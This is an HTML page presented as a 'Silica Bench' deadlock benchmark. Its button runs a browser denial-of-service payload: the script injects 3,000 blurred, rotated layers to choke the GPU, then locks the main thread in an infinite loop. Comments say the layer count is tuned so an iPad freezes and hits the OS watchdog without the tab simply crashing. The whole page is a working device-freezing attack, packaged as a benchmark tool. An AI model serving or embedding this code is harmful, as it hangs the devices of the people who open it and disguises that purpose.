<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Silica Bench: System Deadlock</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fbfbfd; color: #1d1d1f; overflow: hidden; }
        
        .bench-ui {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            border: 1px solid rgba(0,0,0,0.05);
            z-index: 99999;
            position: relative;
            transition: opacity 0.2s;
        }

        #render-target {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }
    </style>
</head>
<body class="h-screen w-screen flex items-center justify-center p-6">

    <div class="bench-ui max-w-sm w-full p-10 text-center" id="ui-panel">
        <div class="mb-8">
            <h1 class="text-3xl font-bold tracking-tight">Silica Bench</h1>
            <p class="text-gray-500 mt-1 text-sm">Deadlock Simulation v9.0</p>
        </div>

        <div class="flex justify-between items-center bg-gray-50 p-4 rounded-xl mb-8 border border-gray-100">
            <span class="text-xs font-bold text-gray-400 uppercase tracking-wider">Engine State</span>
            <span class="text-xs font-bold text-green-500">READY</span>
        </div>

        <button id="start-btn" class="w-full py-4 bg-black text-white rounded-xl font-semibold text-lg hover:bg-gray-800 active:scale-95 transition-all">
            Execute Deadlock
        </button>
        
        <p class="mt-6 text-[10px] text-gray-400 uppercase tracking-widest font-bold">
            Targeting OS Watchdog
        </p>
    </div>

    <!-- The V1 Canvas -->
    <div id="render-target"></div>

    <script>
        const btn = document.getElementById('start-btn');
        const uiPanel = document.getElementById('ui-panel');
        const target = document.getElementById('render-target');

        btn.addEventListener('click', () => {
            btn.innerText = "EXECUTING...";
            btn.style.backgroundColor = "#ff3b30";
            
            // Allow the UI to turn red before the freeze
            setTimeout(() => {
                uiPanel.style.opacity = "0";

                // 1. THE V1 GPU OVERLOAD (The Goldilocks Zone)
                // We use EXACTLY 3,000 layers. 
                // Too many = Instant Tab Crash. Too few = Just Lag.
                let html = "";
                for(let i = 0; i < 3000; i++) {
                    html += `<div style="
                        width: 100px; 
                        height: 100px;
                        position: absolute;
                        top: ${Math.random() * 100}%; 
                        left: ${Math.random() * 100}%;
                        backdrop-filter: blur(10px);
                        box-shadow: 0 0 15px rgba(0,0,0,0.5);
                        transform: rotate(${Math.random() * 360}deg);
                        background: rgba(255,0,0,0.1);
                        will-change: transform;
                    "></div>`;
                }
                
                // Inject the HTML, forcing the GPU to start calculating the blurs
                target.innerHTML = html;

                // 2. THE V1 CPU DEADLOCK
                // We wait exactly 100ms. The iPad has begun drawing the complex blurs, 
                // but hasn't finished. We then permanently lock the main thread.
                setTimeout(() => {
                    const start = Date.now();
                    while(true) {
                        // Keep the CPU pinned at 100% while the GPU is choking
                        if(Date.now() - start > 0) { Math.random(); }
                    }
                }, 100);

            }, 50);
        });
    </script>
</body>
</html>
